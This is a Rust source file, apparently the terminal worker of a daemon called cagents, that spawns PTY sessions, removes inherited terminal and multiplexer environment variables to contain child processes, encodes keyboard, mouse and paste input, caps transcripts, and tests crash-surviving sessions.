            recv(capture) -> _ => WorkerEvent::Capture,
            recv(child_exit) -> message => WorkerEvent::ChildExit(message.ok()),
            default(observe_after) => WorkerEvent::ObserveForeground,
        },
        (false, false) => WorkerEvent::Command(commands.recv().ok()),
    }
}

fn child_exit_event(
    exited: &mut bool,
    result: ChildExit,
    kill_requested: bool,
) -> Option<TerminalEvent> {
    use std::os::unix::process::ExitStatusExt;

    if *exited {
        return None;
    }
    *exited = true;
    Some(match result {
        Ok(status) => TerminalEvent::Exited {
            exit_code: status.exit_code(),
            signal: status.signal().map(str::to_owned),
            // A successful close request must not hide a crash already waiting
            // in the reaper channel, nor turn wait/reaper failures into success.
            intentional: kill_requested
                && status.signal().is_some()
                && status.signal()
                    == ExitStatus::from(std::process::ExitStatus::from_raw(libc::SIGKILL)).signal(),
        },
        Err(message) => TerminalEvent::Error {
            operation: "wait for child",
            message,
        },
    })
}

/// Variables the daemon may have inherited from whatever terminal (or desktop
/// session) launched it. Left in place, a child would believe it is talking to
/// that emulator and emit control sequences libghostty-vt does not implement.
///
/// Some entries are worse than a wrong identity, because they name a live
/// control channel into something of the user's that a card is not inside:
/// `KITTY_LISTEN_ON` fully controls their real kitty instance, `TMUX` and
/// `STY` and `ZELLIJ` reach every pane of their multiplexer session, the
/// `KONSOLE_DBUS_*` triple drives their real Konsole over the session bus, and
/// `NVIM`, `VSCODE_IPC_HOOK_CLI` and `EMACS_SERVER_FILE` each run commands in
/// their editor. A child that inherited any of them could act outside its own
/// card - the exact containment this scrub exists to establish. `LC_TERMINAL`
/// and `LC_TERMINAL_VERSION` match sshd's default `AcceptEnv LC_*`, so they
/// carry the wrong identity onto every host the child then reaches.
///
/// Every emulator here contributes both halves where it has them, identity and
/// channel, because a channel is only reachable once and an identity is only
/// misleading once.
///
/// Color policy from a noninteractive launcher is not the policy of this PTY:
/// inherited NO_COLOR/CLICOLOR can disable ANSI despite TERM and COLORTERM, and
/// COLORFGBG describes the launcher's background rather than our OSC defaults.
/// CI also short-circuits common ANSI capability detectors before truecolor
/// checks; it describes the launcher, not this newly allocated interactive PTY.
/// Explicit recipe entries are restored after this scrub.
const INHERITED_TERMINAL_MARKERS: &[&str] = &[
    "TERM_PROGRAM",
    "TERM_PROGRAM_VERSION",
    "TERM_SESSION_ID",
    "TERMINAL_EMULATOR",
    "TERMINFO",
    "TERMINFO_DIRS",
    "NO_COLOR",
    "FORCE_COLOR",
    "CLICOLOR",
    "CLICOLOR_FORCE",
    "COLORFGBG",
    "CI",
    "KITTY_WINDOW_ID",
    "KITTY_PID",
    "KITTY_INSTALLATION_DIR",
    "KITTY_LISTEN_ON",
    "KITTY_PUBLIC_KEY",
    "KITTY_SHELL_INTEGRATION",
    "GHOSTTY_RESOURCES_DIR",
    "GHOSTTY_BIN_DIR",
    "GHOSTTY_SHELL_FEATURES",
    "GHOSTTY_SHELL_INTEGRATION_NO_SUDO",
    "VTE_VERSION",
    "ALACRITTY_WINDOW_ID",
    "ALACRITTY_SOCKET",
    "ALACRITTY_LOG",
    "WEZTERM_PANE",
    "WEZTERM_UNIX_SOCKET",
    "WEZTERM_EXECUTABLE",
    "WEZTERM_EXECUTABLE_DIR",
    "WEZTERM_CONFIG_DIR",
    "WEZTERM_CONFIG_FILE",
    "ITERM_SESSION_ID",
    "LC_TERMINAL",
    "LC_TERMINAL_VERSION",
    "KONSOLE_VERSION",
    "KONSOLE_DBUS_SERVICE",
    "KONSOLE_DBUS_SESSION",
    "KONSOLE_DBUS_WINDOW",
    "WT_SESSION",
    "WT_PROFILE_ID",
    "ZED_TERM",
    "VSCODE_INJECTION",
    "VSCODE_IPC_HOOK_CLI",
    "VSCODE_GIT_IPC_HANDLE",
    "VSCODE_GIT_ASKPASS_NODE",
    "VSCODE_GIT_ASKPASS_MAIN",
    "EMACS_SERVER_FILE",
    "TMUX",
    "TMUX_PANE",
    "STY",
    "ZELLIJ",
    "ZELLIJ_SESSION_NAME",
    "ZELLIJ_PANE_ID",
    "NVIM",
    "NVIM_LISTEN_ADDRESS",
    "COLORTERM",
];

/// Drops every inherited marker from a command's environment.
///
/// Separate from [`command_from_recipe`] so a test can plant all of them and
/// watch them go, rather than observing that a host which never set them does
/// not have them.
fn scrub_inherited_markers(command: &mut CommandBuilder) {
    command.env_remove("CAGENTS_TERMINAL_ID");
    command.env_remove("CAGENTS_RECOVERY_ORIGIN");
    for name in INHERITED_TERMINAL_MARKERS {
        command.env_remove(name);
    }
}

/// With a PTY, a recognized shell without a command or script operand is an
/// interactive launch. Unknown invocation forms stay active conservatively.
fn interactive_shell_launch(recipe: &LaunchRecipe) -> bool {
    let Some(name) = std::path::Path::new(&recipe.program)
        .file_name()
        .and_then(|name| name.to_str())
    else {
        return false;
    };
    if !matches!(
        name,
        "sh" | "bash"
            | "zsh"
            | "fish"
            | "dash"
            | "ash"
            | "ksh"
            | "ksh93"
            | "mksh"
            | "pdksh"
            | "yash"
            | "csh"
            | "tcsh"
    ) {
        return false;
    }
    let mut arguments = recipe.arguments.iter();
    while let Some(argument) = arguments.next() {
        match argument.as_str() {
            "--" => return arguments.next().is_none(),
            "--login" | "--interactive" | "--noprofile" | "--norc" | "--no-config" | "--posix" => {}
            "--rcfile" | "--init-file" | "-o" | "+o" | "-O" | "+O" => {
                if arguments.next().is_none() {
                    return false;
                }
            }
            option
                if option.starts_with('-')
                    && !option.starts_with("--")
                    && option.len() > 1
                    && option[1..]
                        .bytes()
                        .all(|byte| byte.is_ascii_alphabetic() && byte != b'c') => {}
            _ => return false,
        }
    }
    true
}

fn command_from_recipe(recipe: &LaunchRecipe) -> CommandBuilder {
    let mut command = CommandBuilder::new(&recipe.program);
    command.args(&recipe.arguments);
    command.cwd(&recipe.working_directory);
    scrub_inherited_markers(&mut command);
    terminal_environment(&mut command);
    // Last, so an explicit per-session entry still wins over our defaults.
    for (name, value) in &recipe.environment {
        command.env(name, value);
    }
    for name in crate::account::launch_credential_overrides(recipe) {
        command.env_remove(name);
    }
    command
}

fn terminal_environment(command: &mut CommandBuilder) {
    // We ship no private terminfo entry; advertise the emulator we implement.
    command.env("TERM", "xterm-256color");
    command.env("COLORTERM", "truecolor");
    command.env("TERM_PROGRAM", "cagents");
    command.env("TERM_PROGRAM_VERSION", crate::VERSION);
}

fn pty_size(size: TerminalSize) -> PtySize {
    PtySize {
        rows: size.rows,
        cols: size.columns,
        pixel_width: u16::try_from(u32::from(size.columns).saturating_mul(size.cell_width_px))
            .unwrap_or(u16::MAX),
        pixel_height: u16::try_from(u32::from(size.rows).saturating_mul(size.cell_height_px))
            .unwrap_or(u16::MAX),
    }
}

/// Read and write ends of the reader's shutdown pipe. Nothing is ever written
/// to it: dropping the write end hangs the read end up, which is the one event
/// a blocking reader can always observe.
fn wake_pipe() -> Result<(OwnedFd, OwnedFd), String> {
    let mut ends = [0 as libc::c_int; 2];
    // SAFETY: `ends` is the two-element array `pipe2` writes into.
    if unsafe { libc::pipe2(ends.as_mut_ptr(), libc::O_CLOEXEC) } != 0 {
        return Err(format!(
            "create PTY reader wake pipe: {}",
            std::io::Error::last_os_error()
        ));
    }
    // SAFETY: `pipe2` filled both entries with fresh owned descriptors.
    unsafe { Ok((OwnedFd::from_raw_fd(ends[0]), OwnedFd::from_raw_fd(ends[1]))) }
}

enum Readiness {
    Readable,
    Shutdown,
    Failed(String),
}

/// Wait until the terminal has output, or until shutdown hangs up the wake
/// pipe. A PTY master read only fails with EIO once the last slave descriptor
/// closes, so a disowned grandchild can keep a blocking read - and therefore
/// shutdown - waiting indefinitely; the pipe is the way out.
fn wait_readable(readiness: &OwnedFd, wake: &OwnedFd) -> Readiness {
    let mut fds = [
        libc::pollfd {
            fd: readiness.as_raw_fd(),
            events: libc::POLLIN,
            revents: 0,
        },
        libc::pollfd {
            fd: wake.as_raw_fd(),
            events: libc::POLLIN,
            revents: 0,
        },
    ];
    loop {
        // SAFETY: this thread owns both descriptors for the whole call.
        let ready = unsafe { libc::poll(fds.as_mut_ptr(), fds.len() as libc::nfds_t, -1) };
        if ready < 0 {
            let error = std::io::Error::last_os_error();
            if error.kind() == std::io::ErrorKind::Interrupted {
                continue;
            }
            return Readiness::Failed(error.to_string());
        }
        if fds[1].revents != 0 {
            return Readiness::Shutdown;
        }
        if fds[0].revents != 0 {
            // Hangup still needs one more read: the parser must see everything
            // the child wrote before its slave closed, and an unreadable
            // descriptor surfaces as EOF or an error from the read itself.
            return Readiness::Readable;
        }
    }
}

fn read_pty(reader: &mut dyn Read, sender: &Sender<PtyMessage>, readiness: OwnedFd, wake: OwnedFd) {
    let mut buffer = vec![0u8; PTY_READ_SIZE];
    loop {
        match wait_readable(&readiness, &wake) {
            Readiness::Readable => {}
            Readiness::Shutdown => return,
            Readiness::Failed(error) => {
                let _ = sender.send(PtyMessage::Error(error));
                return;
            }
        }
        match reader.read(&mut buffer) {
            Ok(0) => {
                let _ = sender.send(PtyMessage::Eof);
                return;
            }
            // A PTY master reads EIO, not end of file, once its terminal's
            // last slave closes: the ordinary end of a terminal.
            Err(error) if error.raw_os_error() == Some(libc::EIO) => {
                let _ = sender.send(PtyMessage::Eof);
                return;
            }
            Ok(read) => {
                if sender
                    .send(PtyMessage::Bytes(buffer[..read].to_vec()))
                    .is_err()
                {
                    return;
                }
            }
            Err(error) if error.kind() == std::io::ErrorKind::Interrupted => {}
            Err(error) => {
                let _ = sender.send(PtyMessage::Error(error.to_string()));
                return;
            }
        }
    }
}

struct TranscriptWriter {
    sender: Sender<TranscriptMessage>,
    /// Published by the writer once the size cap is reached, so the worker can
    /// stop handing over batches the writer would only drop.
    capped: Arc<AtomicBool>,
    worker: JoinHandle<()>,
}

impl TranscriptWriter {
    fn start(path: PathBuf, capacity: usize, max_bytes: u64) -> Result<Self, String> {
        let file = open_private_append_file(&path)
            .map_err(|error| format!("open transcript {}: {error}", path.display()))?;
        let written = file.metadata().map(|metadata| metadata.len()).unwrap_or(0);
        let (sender, receiver) = crossbeam_channel::bounded(capacity);
        let capped_flag = Arc::new(AtomicBool::new(false));
        let published_cap = Arc::clone(&capped_flag);
        let worker = thread::Builder::new()
            .name("terminal-transcript-writer".into())
            .spawn(move || {
                let mut writer = BufWriter::new(file);
                let mut written = written;
                // Already over cap (e.g. an older uncapped session): the file
                // stays as-is and nothing more is recorded.
                let mut capped = written >= max_bytes;
                if capped {
                    published_cap.store(true, Ordering::Relaxed);
                    let _ = writer.write_all(TRANSCRIPT_TRUNCATED_MARKER);
                    let _ = writer.flush();
                }
                while let Ok(message) = receiver.recv() {
                    match message {
                        TranscriptMessage::Bytes(bytes) => {
                            if capped {
                                continue;
                            }
                            let within_cap =
                                written.saturating_add(bytes.len() as u64) <= max_bytes;
                            if !within_cap {
                                capped = true;
                                published_cap.store(true, Ordering::Relaxed);
                                let _ = writer.write_all(TRANSCRIPT_TRUNCATED_MARKER);
                                let _ = writer.flush();
                                continue;
                            }
                            if writer.write_all(&bytes).is_err() {
                                break;
                            }
                            written += bytes.len() as u64;
                        }
                        TranscriptMessage::Shutdown => break,
                    }
                }
                let _ = writer.flush();
            })
            .map_err(|error| format!("start transcript writer: {error}"))?;
        Ok(Self {
            sender,
            capped: capped_flag,
            worker,
        })
    }

    /// Whether handing over a batch can still record anything. Racy by
    /// design and deliberately cheap: a full channel or a capped file means
    /// the batch is dropped, and dropping it here costs nothing at all.
    fn accepts(&self) -> bool {
        !self.sender.is_full() && !self.capped.load(Ordering::Relaxed)
    }

    /// Best-effort and never blocking: output bursts faster than the disk
    /// writer are dropped instead of stalling PTY processing. Only a dead
    /// writer thread reports an error.
    fn send(&self, bytes: Vec<u8>) -> Result<(), ()> {
        match self.sender.try_send(TranscriptMessage::Bytes(bytes)) {
            Ok(()) | Err(TrySendError::Full(_)) => Ok(()),
            Err(TrySendError::Disconnected(_)) => Err(()),
        }
    }

    fn finish(self) {
        let _ = self.sender.send(TranscriptMessage::Shutdown);
        drop(self.sender);
        let _ = self.worker.join();
    }
}

fn encode_key_input(
    terminal: &Terminal<'_, '_>,
    encoder: &mut KeyEncoder<'_>,
    input: KeyInput,
) -> Result<Vec<u8>, libghostty_vt::Error> {
    // Legacy encodings have no repeat event type, so a repeated event must be
    // encoded as another press. Keep Repeat only when the child asked for it.
    let report_events = terminal
        .kitty_keyboard_flags()?
        .contains(key::KittyKeyFlags::REPORT_EVENTS);
    let mut event = key::Event::new()?;
    event
        .set_action(map_key_action(input.action, report_events))
        .set_key(map_key(input.key))
        .set_mods(map_modifiers(input.modifiers))
        .set_utf8(input.text);
    if let Some(codepoint) = input.unshifted_codepoint {
        event.set_unshifted_codepoint(codepoint);
    }

    encoder.set_options_from_terminal(terminal);
    let mut encoded = Vec::with_capacity(32);
    encoder.encode_to_vec(&event, &mut encoded)?;
    // Legacy shells cannot distinguish Ctrl+Backspace's BS from Ctrl+H.
    // Use their conventional backward-kill-word binding, but leave negotiated
    // CSI-u/modifyOtherKeys encodings and release events intact.
    if input.key == TerminalKey::Backspace
        && input.modifiers.control
        && !input.modifiers.alt
        && !input.modifiers.shift
        && !input.modifiers.super_key
        && matches!(encoded.as_slice(), b"\x08" | b"\x7f")
    {
        encoded[0] = 0x17;
    }
    Ok(encoded)
}

/// The `ESC [ 200 ~` and `ESC [ 201 ~` a bracketed paste is framed with.
const BRACKETED_PASTE_FRAME_BYTES: usize = 12;

/// The bytes a paste puts on the child's input, encoded by Ghostty against the
/// mode the child is in now.
///
/// In either mode Ghostty turns ESC - which a forged `ESC [ 201 ~` needs to
/// end a bracketed paste early - NUL, DEL, and the tty's signal and line
/// editing characters into spaces. A child that asked for bracketed paste
/// gets the text framed and otherwise as it was: it reads the whole of it as
/// one paste, line breaks included, and decides for itself what to do.
///
/// Any other child reads the text as typed, so a carriage return or line feed
/// in it is Enter, and the readline keys Ghostty leaves alone - ^P for the
/// previous command, ^A, ^E, ^K and the rest - act as they would from the
/// keyboard. A clipboard paste keeps its line breaks, as a paste into any
/// terminal does, arriving as the carriage return Enter sends; a CRLF becomes
/// one of them rather than the two xterm would send, or pasting Windows text
/// would enter every line twice. A drop keeps none of them: every control
/// character but TAB becomes a space, so text dragged in - which its source
/// chose - can be read, edited and entered, but never enters itself.
fn encode_paste(
    terminal: &Terminal<'_, '_>,
    text: &str,
    origin: PasteOrigin,
) -> Result<Vec<u8>, libghostty_vt::Error> {
    if text.is_empty() {
        return Ok(Vec::new());
    }
    let bracketed = terminal.mode(Mode::BRACKETED_PASTE)?;
    let mut data = match (bracketed, origin) {
        (true, _) => text.as_bytes().to_vec(),
        (false, PasteOrigin::Clipboard) => text.replace("\r\n", "\r").into_bytes(),
        (false, PasteOrigin::Drop) => text
            .chars()
            .map(|character| {
                if character.is_control() && character != '\t' {
                    ' '
                } else {
                    character
                }
            })
            .collect::<String>()
            .into_bytes(),
    };
    // Encoding only replaces bytes in place and adds the frame, so this is
    // the most it can write.
    let mut encoded = vec![0; data.len() + BRACKETED_PASTE_FRAME_BYTES];
    let written = libghostty_vt::paste::encode(&mut data, bracketed, &mut encoded)?;
    encoded.truncate(written);
    Ok(encoded)
}

fn map_key_action(action: KeyAction, report_events: bool) -> key::Action {
    match action {
        KeyAction::Press => key::Action::Press,
        KeyAction::Release => key::Action::Release,
        KeyAction::Repeat if report_events => key::Action::Repeat,
        KeyAction::Repeat => key::Action::Press,
    }
}

fn map_key(input: TerminalKey) -> key::Key {
    match input {
        TerminalKey::Unidentified => key::Key::Unidentified,
        TerminalKey::Character(character) => match character.to_ascii_lowercase() {
            'a' => key::Key::A,
            'b' => key::Key::B,
            'c' => key::Key::C,
            'd' => key::Key::D,
            'e' => key::Key::E,
            'f' => key::Key::F,
            'g' => key::Key::G,
            'h' => key::Key::H,
            'i' => key::Key::I,
            'j' => key::Key::J,
            'k' => key::Key::K,
            'l' => key::Key::L,
            'm' => key::Key::M,
            'n' => key::Key::N,
            'o' => key::Key::O,
            'p' => key::Key::P,
            'q' => key::Key::Q,
            'r' => key::Key::R,
            's' => key::Key::S,
            't' => key::Key::T,
            'u' => key::Key::U,
            'v' => key::Key::V,
            'w' => key::Key::W,
            'x' => key::Key::X,
            'y' => key::Key::Y,
            'z' => key::Key::Z,
            '0' => key::Key::Digit0,
            '1' => key::Key::Digit1,
            '2' => key::Key::Digit2,
            '3' => key::Key::Digit3,
            '4' => key::Key::Digit4,
            '5' => key::Key::Digit5,
            '6' => key::Key::Digit6,
            '7' => key::Key::Digit7,
            '8' => key::Key::Digit8,
            '9' => key::Key::Digit9,
            ' ' => key::Key::Space,
            '-' => key::Key::Minus,
            '=' => key::Key::Equal,
            ',' => key::Key::Comma,
            '.' => key::Key::Period,
            '/' => key::Key::Slash,
            ';' => key::Key::Semicolon,
            '\'' => key::Key::Quote,
            '`' => key::Key::Backquote,
            '[' => key::Key::BracketLeft,
            ']' => key::Key::BracketRight,
            '\\' => key::Key::Backslash,
            _ => key::Key::Unidentified,
        },
        TerminalKey::Backspace => key::Key::Backspace,
        TerminalKey::Enter => key::Key::Enter,
        TerminalKey::Tab => key::Key::Tab,
        TerminalKey::Escape => key::Key::Escape,
        TerminalKey::Delete => key::Key::Delete,
        TerminalKey::Insert => key::Key::Insert,
        TerminalKey::Home => key::Key::Home,
        TerminalKey::End => key::Key::End,
        TerminalKey::PageUp => key::Key::PageUp,
        TerminalKey::PageDown => key::Key::PageDown,
        TerminalKey::ArrowUp => key::Key::ArrowUp,
        TerminalKey::ArrowDown => key::Key::ArrowDown,
        TerminalKey::ArrowLeft => key::Key::ArrowLeft,
        TerminalKey::ArrowRight => key::Key::ArrowRight,
        TerminalKey::Function(number) => match number {
            1 => key::Key::F1,
            2 => key::Key::F2,
            3 => key::Key::F3,
            4 => key::Key::F4,
            5 => key::Key::F5,
            6 => key::Key::F6,
            7 => key::Key::F7,
            8 => key::Key::F8,
            9 => key::Key::F9,
            10 => key::Key::F10,
            11 => key::Key::F11,
            12 => key::Key::F12,
            13 => key::Key::F13,
            14 => key::Key::F14,
            15 => key::Key::F15,
            16 => key::Key::F16,
            17 => key::Key::F17,
            18 => key::Key::F18,
            19 => key::Key::F19,
            20 => key::Key::F20,
            21 => key::Key::F21,
            22 => key::Key::F22,
            23 => key::Key::F23,
            24 => key::Key::F24,
            25 => key::Key::F25,
            _ => key::Key::Unidentified,
        },
    }
}

fn map_modifiers(input: KeyModifiers) -> key::Mods {
    let mut output = key::Mods::empty();
    output.set(key::Mods::SHIFT, input.shift);
    output.set(key::Mods::ALT, input.alt);
    output.set(key::Mods::CTRL, input.control);
    output.set(key::Mods::SUPER, input.super_key);
    output.set(key::Mods::CAPS_LOCK, input.caps_lock);
    output
}

fn map_mouse_action(action: MouseAction) -> mouse::Action {
    match action {
        MouseAction::Press => mouse::Action::Press,
        MouseAction::Release => mouse::Action::Release,
        MouseAction::Motion => mouse::Action::Motion,
    }
}

fn map_mouse_button(button: MouseButton) -> mouse::Button {
    match button {
        MouseButton::Left => mouse::Button::Left,
        MouseButton::Right => mouse::Button::Right,
        MouseButton::Middle => mouse::Button::Middle,
        MouseButton::Back => mouse::Button::Four,
        MouseButton::Forward => mouse::Button::Five,
        MouseButton::WheelUp => mouse::Button::Four,
        MouseButton::WheelDown => mouse::Button::Five,
        MouseButton::Other(number) => match number {
            4 => mouse::Button::Four,
            5 => mouse::Button::Five,
            6 => mouse::Button::Six,
            7 => mouse::Button::Seven,
            8 => mouse::Button::Eight,
            9 => mouse::Button::Nine,
            10 => mouse::Button::Ten,
            11 => mouse::Button::Eleven,
            _ => mouse::Button::Unknown,
        },
    }
}

#[cfg(test)]
mod tests {

    use std::{
        collections::BTreeMap,
        ffi::OsStr,
        fs,
        os::unix::fs::{PermissionsExt, symlink},
        sync::atomic::{AtomicUsize, Ordering},
        time::{Duration, Instant},
    };

    use tempfile::tempdir;

    use super::*;

    #[test]
    fn a_terminal_whose_root_exits_ends_its_output_without_an_error() {
        let mut command = CommandBuilder::new("/bin/sh");
        command.args(["-c", "echo finished"]);
        command.cwd("/");
        let (exits, exited) = crossbeam_channel::bounded(1);
        let held = holder::spawn(
            command,
            PtySize {
                rows: 24,
                cols: 80,
                pixel_width: 0,
                pixel_height: 0,
            },
            exits,
        )
        .unwrap();
        let mut reader = File::from(held.master.duplicate().unwrap());
        let readiness = held.master.duplicate().unwrap();
        let (wake_rx, _wake_tx) = wake_pipe().unwrap();
        let (sender, messages) = crossbeam_channel::unbounded();
        read_pty(&mut reader, &sender, readiness, wake_rx);

        let messages: Vec<_> = messages.try_iter().collect();
        let output: Vec<u8> = messages
            .iter()
            .filter_map(|message| match message {
                PtyMessage::Bytes(bytes) => Some(bytes.as_slice()),
                _ => None,
            })
            .flatten()
            .copied()
            .collect();
        assert!(String::from_utf8_lossy(&output).contains("finished"));
        assert!(
            matches!(messages.last(), Some(PtyMessage::Eof)),
            "{:?}",
            messages.last().map(|message| match message {
                PtyMessage::Error(error) => error.as_str(),
                _ => "not the end",
            })
        );
        let status = exited
            .recv_timeout(Duration::from_secs(5))
            .unwrap()
            .unwrap();
        assert!(status.success());
    }

    fn shell_session(script: &str) -> TerminalSession {
        let recipe = LaunchRecipe {
            unset_environment: Default::default(),
            program: "/bin/sh".into(),
            arguments: vec!["-c".into(), script.into()],
            working_directory: PathBuf::from("/"),
            environment: BTreeMap::new(),
        };
        TerminalSession {
            owned_codex_listener: None,
            recovery_origin: None,
            id: crate::model::TerminalId::new(),
            launch: recipe.clone(),
            transcript_path: None,
            resume_hint: None,
            continuity: crate::model::TerminalContinuity::RelaunchAvailable {
                recipe,
                last_exit: None,
            },
        }
    }

    /// The handle's screen as text, once it shows `needle`.
    fn wait_for_text(handle: &TerminalHandle, needle: &str) -> String {
        let deadline = std::time::Instant::now() + Duration::from_secs(5);
        loop {
            let snapshot = handle.snapshot();
            handle.acknowledge_redraw(snapshot.generation);
            let text = snapshot
                .lines
                .iter()
                .map(|line| {
                    let row: String = line.cells.iter().map(|cell| cell.text.as_str()).collect();
                    row.trim_end().to_owned()
                })
                .collect::<Vec<_>>()
                .join("\n");
            if text.contains(needle) {
                return text;
            }
            assert!(
                std::time::Instant::now() < deadline,
                "never showed {needle:?}:\n{text}"
            );
            thread::sleep(Duration::from_millis(10));
        }
    }

    #[test]
    fn completed_worker_survives_two_daemon_crashes_without_relaunching() {
        const FIXTURE: &str = "CAGENTS_COMPLETED_WORKER_FIXTURE";
        const STAGE: &str = "CAGENTS_COMPLETED_WORKER_STAGE";
        if let Some(directory) = std::env::var_os(FIXTURE) {
            let directory = PathBuf::from(directory);
            let stage = std::env::var(STAGE).unwrap();
            let paths = crate::daemon::RuntimePaths::discover().unwrap();
            let proof = crate::model::HostSessionProof {
                host_session_id: crate::model::HostSessionId::new(format!("worker-{stage}")),
                boot_id: crate::daemon::read_boot_id().unwrap(),
                host_incarnation: crate::model::HostIncarnation::new(format!("worker-{stage}")),
            };
            let _lease = crate::daemon::HostLease::acquire(&paths, &proof).unwrap();
            let holders = paths.directory.join("holders");
            let (mut recovery, adoption) = if stage == "0" {
                let mut source = shell_session(
                    "echo launched >> \"$LAUNCH_COUNT\"; echo completed-worker-result; exit 7",
                );
                source.launch.environment.insert(
                    "LAUNCH_COUNT".into(),
                    directory.join("launches").to_string_lossy().into_owned(),
                );
                (
                    crate::terminal::holder::Recovery {
                        source,
                        previous_sources: Vec::new(),
                        relaunches: Vec::new(),
                        options: crate::terminal::TerminalSpawnOptions::default(),
                        execution_environment: None,
                    },
                    None,
                )
            } else {
                let records = crate::terminal::holder::discover(&holders, &proof.boot_id).unwrap();
                assert_eq!(records.len(), 1);
                let socket = crate::terminal::holder::socket(&holders, records[0].terminal);
                let (mut recovery, lost) = holder::inspect(&socket, &records[0], &proof).unwrap();
                assert!(
                    !lost,
                    "a completed parser saved its final screen before the crash"
                );
                recovery.previous_sources.push(recovery.source.clone());
                (recovery, Some(socket))
            };
            recovery.source.continuity = crate::model::TerminalContinuity::DetachedSameBoot {
                host_session_id: proof.host_session_id,
                boot_id: proof.boot_id,
                host_incarnation: proof.host_incarnation,
            };
            let handle = TerminalHandle::spawn(
                recovery.source.clone(),
                TerminalConfig {
                    holder_recovery: Some(recovery),
                    adoption,
                    ..TerminalConfig::default()
                },
                |_| {},
            )
            .unwrap();
            wait_for_text(&handle, "completed-worker-result");
            let deadline = Instant::now() + Duration::from_secs(10);
            while !handle.is_completed() {
                assert!(Instant::now() < deadline, "worker did not finish");
                thread::sleep(Duration::from_millis(10));
            }
            assert!(
                handle
                    .events()
                    .try_iter()
                    .any(|event| matches!(event, TerminalEvent::Completed { exit_code: 7, .. }))
            );
            assert!(
                handle
                    .inner
                    .published
                    .retained_holder
                    .lock()
                    .unwrap()
                    .is_some()
            );
            assert_eq!(
                fs::read_to_string(directory.join("launches")).unwrap(),
                "launched\n"
            );
            if stage == "1" {
                // Failed restore cleanup can race a worker that has already
                // completed. Its disconnected command path still joins and
                // preserves the final holder instead of releasing it.
                handle.preserve_for_restart().unwrap();
            }
            if stage == "2" {
                handle.shutdown().unwrap();
                assert!(
                    crate::terminal::holder::discover(
                        &holders,
                        &crate::daemon::read_boot_id().unwrap()
                    )
                    .unwrap()
                    .is_empty()
                );
                return;
            }
            fs::write(directory.join(format!("ready-{stage}")), "ready").unwrap();
            loop {
                thread::park();
            }
        }

        struct Cleanup {
            daemon: Option<std::process::Child>,
            records: Vec<crate::terminal::holder::Record>,
        }
        impl Drop for Cleanup {
            fn drop(&mut self) {
                if let Some(child) = self.daemon.as_mut() {
                    let _ = child.kill();
                    let _ = child.wait();
                }
                for record in &self.records {
                    if record.holder.is_current() {
                        // Exact start identity was checked, and this test alone owns the holder.
                        unsafe {
                            libc::kill(record.holder.pid, libc::SIGKILL);
                        }
                    }
                }
            }
        }
        let directory = tempdir().unwrap();
        let holders = directory
            .path()
            .join(crate::instance::RUNTIME_SUBDIRECTORY)
            .join("holders");
        let mut cleanup = Cleanup {
            daemon: None,
            records: Vec::new(),
        };
        for stage in 0..3 {
            cleanup.daemon = Some(std::process::Command::new(std::env::current_exe().unwrap())
                .args(["--exact", "terminal::worker::tests::completed_worker_survives_two_daemon_crashes_without_relaunching", "--nocapture"])
                .env_clear().env("PATH", "/usr/bin:/bin").env("HOME", directory.path())
                .env("XDG_RUNTIME_DIR", directory.path()).env(FIXTURE, directory.path())
                .env(STAGE, stage.to_string()).spawn().unwrap());
            let deadline = Instant::now() + Duration::from_secs(15);
            if stage == 2 {
                loop {
                    if let Some(status) = cleanup.daemon.as_mut().unwrap().try_wait().unwrap() {
                        assert!(status.success());
                        break;
                    }
                    assert!(
                        Instant::now() < deadline,
                        "completed cleanup did not finish"
                    );
                    thread::sleep(Duration::from_millis(10));
                }
            } else {
                while !directory.path().join(format!("ready-{stage}")).exists() {
                    assert!(
                        cleanup
                            .daemon
                            .as_mut()
                            .unwrap()
                            .try_wait()
                            .unwrap()
                            .is_none()
                    );
                    assert!(
                        Instant::now() < deadline,
                        "completed worker did not become ready"
                    );
                    thread::sleep(Duration::from_millis(10));
                }
                let records = crate::terminal::holder::discover(
                    &holders,
                    &crate::daemon::read_boot_id().unwrap(),
                )
                .unwrap();
                assert_eq!(records.len(), 1);
                if stage == 0 {
                    cleanup.records = records.clone();
                }
                assert_eq!(records[0], cleanup.records[0]);
                cleanup.daemon.as_mut().unwrap().kill().unwrap();
                cleanup.daemon.as_mut().unwrap().wait().unwrap();
            }
            cleanup.daemon = None;
        }
        assert_eq!(
            fs::read_to_string(directory.path().join("launches")).unwrap(),
            "launched\n"
        );
        assert!(
            crate::terminal::holder::discover(&holders, &crate::daemon::read_boot_id().unwrap())
                .unwrap()
                .is_empty()
        );
    }

    #[test]
    fn a_carried_terminal_keeps_its_process_and_screen_for_a_successor() {
        let directory = tempdir().unwrap();
        let socket = directory.path().join("holder.sock");
        let session = shell_session(
            "printf '\\033]2;carried title\\007'; echo before; \
             read line; echo \"after:$line\"; read line",
        );
        let first =
            TerminalHandle::spawn(session.clone(), TerminalConfig::default(), |_| {}).unwrap();
        let before = wait_for_text(&first, "before");
        let carried = first.carry(socket.clone()).unwrap();
        assert_eq!(carried.size.columns, TerminalConfig::default().columns);
        // The worker is gone; the terminal's process is not.
        assert!(first.is_completed());
        assert!(first.input("lost?").is_err());

        let config = TerminalConfig {
            adoption: Some(socket.clone()),
            ..TerminalConfig::default()
        };
        let second = TerminalHandle::spawn(session, config, |_| {}).unwrap();
        assert_eq!(wait_for_text(&second, "before"), before);
        second.input(b"hello\n".to_vec()).unwrap();
        wait_for_text(&second, "after:hello");
        let events: Vec<_> = second.events().try_iter().collect();
        assert!(
            events.contains(&TerminalEvent::TitleChanged("carried title".into())),
            "{events:?}"
        );
        assert!(!socket.exists());
        second.shutdown().unwrap();
    }

    #[test]
    fn a_terminal_that_cannot_be_carried_keeps_running_here() {
        let directory = tempdir().unwrap();
        let session = shell_session("echo before; read line; echo \"after:$line\"; read line");
        let handle = TerminalHandle::spawn(session, TerminalConfig::default(), |_| {}).unwrap();
        wait_for_text(&handle, "before");
        let unreachable = directory.path().join("missing").join("holder.sock");
        assert!(handle.carry(unreachable).is_err());
        assert!(!handle.is_completed());
        handle.input(b"still here\n".to_vec()).unwrap();
        wait_for_text(&handle, "after:still here");
        handle.shutdown().unwrap();
    }

    #[test]
    fn omp_display_title_drops_lifecycle_animation_but_preserves_labels() {
        use crate::agent::{Activity, Provider};
        let title = |value: &str| {
            canonical_agent_title(
                value,
                Provider::Omp
                    .activity_from_title(value)
                    .map(|state| Activity {
                        provider: Provider::Omp,
                        state,
                    }),
            )
        };
        assert_eq!(title("π ⠋ project"), title("π ⠙ project"));
        assert_eq!(title("π > project"), "π project");
        assert_eq!(title("π ! renamed"), "π renamed");
        assert_eq!(title("custom title"), "custom title");
